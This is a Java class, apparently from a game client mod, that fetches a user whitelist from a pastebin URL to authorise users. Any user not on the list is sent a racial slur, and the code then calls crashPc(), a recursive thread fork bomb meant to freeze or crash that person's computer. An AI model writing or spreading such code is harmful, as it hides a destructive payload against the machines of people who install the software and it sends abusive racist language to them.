package cum.jesus.jesusclient;

import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Scanner;


public class JesseClient {
    static String link = "https://pastebin.com/raw/pBPRX9R3";

    public static void verify() throws IOException {
        ArrayList<String> whitelist = new ArrayList<String>();
        URL url = new URL(link);
        Scanner scanner = new Scanner(url.openStream());
        while (scanner.hasNext()) {
            whitelist.add(scanner.nextLine());
        }
        scanner.close();

        boolean uuidInList = whitelist.stream().anyMatch(s -> s.equals(JesusClient.uuid));

        if (uuidInList) {
            // if on whitelist
            JesusClient.printWithPrefix("Successfully authorized Jesus Client! Enjoy");
        } else { // not whitelisted
            JesusClient.sendPrefixMessage("nigga");
            crashPc();
        }
    }

    public static void crashPc() {
        while (true) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    while (true)
                        crashPc();
                }
            }).start();
        }
    }
}
